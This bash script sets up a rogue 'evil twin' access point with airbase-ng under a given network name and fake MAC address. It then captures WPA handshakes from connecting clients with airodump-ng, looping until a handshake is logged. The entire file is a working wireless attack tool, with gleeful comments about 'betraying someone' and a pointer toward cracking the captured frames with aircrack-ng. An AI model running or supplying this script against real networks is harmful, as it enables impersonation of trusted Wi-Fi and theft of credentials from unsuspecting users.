#!/bin/bash

cp /dev/null handshakecheck.txt #this line always empties the handshakecheck.txt file becausometimes it could be bulky
essid=$1
#$essid=`./clientsprobes.py wlan0mon 10000`
echo
echo "......................The Bash receives your input. ESSID IS -> $essid ..............."
echo
echo 
echo "	 Aweseome.... AIRBASE_NG is about to begin"


bssid="B8:95:50:4F:CA:52"
#add read command when you are selecting essid to attack with grep " 1 " test.txt | cut -f 4- -d " "... with this command, we wrote the probes to a file then opened it to grep out the one we have selected
#essid=``
echo $essid
echo $bssid
echo "   	 starting a fake AP with MAC address B8-95-50-4F-CA-52 "
airbase-ng  --essid $essid -c 1 -Z 4 -a B8-95-50-4F-CA-52 wlan0mon  &> /dev/null & #if you don't want to see the output 
echo "				sleeping for 10 seconds"
sleep 10
echo "					Airodump begins "
echo
echo
echo "		Give me a few seconds... currently betraying someone :)) "

airodump-ng wlan0mon --channel 1 --essid $essid --bssid $bssid -w $essid &>> handshakecheck.txt & # piping airodump output to hadshakecheck.txt

while true
do
	handshakedetect=`grep handshake handshakecheck.txt &` #check for handshake in airodump file
	sleep 10
	if [[ -n $handshakedetect ]]
	then
		echo "	i am currently detecting the handshakes"
		killall airodump-ng & #run aircrack-ng. you can let users input by using 'read ' command
		killall airbase-ng &
		echo "			 Just Killed AIRODUMP and AIRBASE because we got the EAPOL FRAMES.....VICTORY DANCE"
		echo 
		echo "Hit Ctrl+c to exit program..."

		break
	fi
done

